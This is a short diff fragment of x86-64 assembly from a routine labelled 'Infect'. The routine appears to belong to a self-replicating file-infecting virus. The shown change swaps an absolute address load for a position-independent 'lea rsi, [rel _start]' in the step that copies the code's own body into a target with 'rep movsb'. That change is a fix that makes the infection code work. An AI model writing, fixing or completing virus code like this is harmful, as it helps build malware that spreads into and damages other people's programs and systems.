@@ -259,7 +259,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   sub   rsp,  0x8
   push  rdi
 
-  mov   rsi, _start                                     ; src address
+  lea   rsi,  [rel _start]                              ; src address
   mov   rdi,  [rsp + 0x10]  
   add   rdi,  r10                                       ; dest address
   rep   movsb
